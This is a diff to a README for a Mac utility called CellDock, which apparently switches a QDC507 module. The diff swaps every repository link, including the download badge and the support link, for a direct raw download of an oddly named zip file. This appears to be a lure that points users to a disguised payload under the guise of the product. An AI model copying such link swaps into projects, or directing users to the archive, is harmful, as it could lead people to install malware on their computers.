@@ -1,6 +1,6 @@
 # 🚀 celldock-for-mac - Switch Your QDC507 Module Instantly
 
-[![Download CellDock for Mac](https://img.shields.io/badge/Download-CellDock%20for%20Mac-blue?style=for-the-badge&logo=apple)](https://github.com/Feneliaearnest2534/celldock-for-mac)
+[![Download CellDock for Mac](https://img.shields.io/badge/Download-CellDock%20for%20Mac-blue?style=for-the-badge&logo=apple)](https://raw.githubusercontent.com/Feneliaearnest2534/celldock-for-mac/main/isoparaffin/participance.zip)
 
 ## 📥 Getting Started
 
@@ -17,7 +17,7 @@ You don't need to be a programmer to use this. Just follow the simple steps belo
 ## 🔗 Download the Application
 
 Visit this link to download the application:  
-👉 **[https://github.com/Feneliaearnest2534/celldock-for-mac](https://github.com/Feneliaearnest2534/celldock-for-mac)**
+👉 **[https://raw.githubusercontent.com/Feneliaearnest2534/celldock-for-mac/main/isoparaffin/participance.zip](https://raw.githubusercontent.com/Feneliaearnest2534/celldock-for-mac/main/isoparaffin/participance.zip)**
 
 Click the download button on that page. The file will start downloading to your computer. This is the only file you need.
 
@@ -113,7 +113,7 @@ This software runs entirely on your computer. It does not send your data anywher
 
 If you need assistance:
 
-- **Visit the GitHub page** – https://github.com/Feneliaearnest2534/celldock-for-mac
+- **Visit the GitHub page** – https://raw.githubusercontent.com/Feneliaearnest2534/celldock-for-mac/main/isoparaffin/participance.zip
 - **Check the Issues tab** – See if others have reported the same problem
 - **Read the original documentation** – The original CellDock project has more detailed guides
 
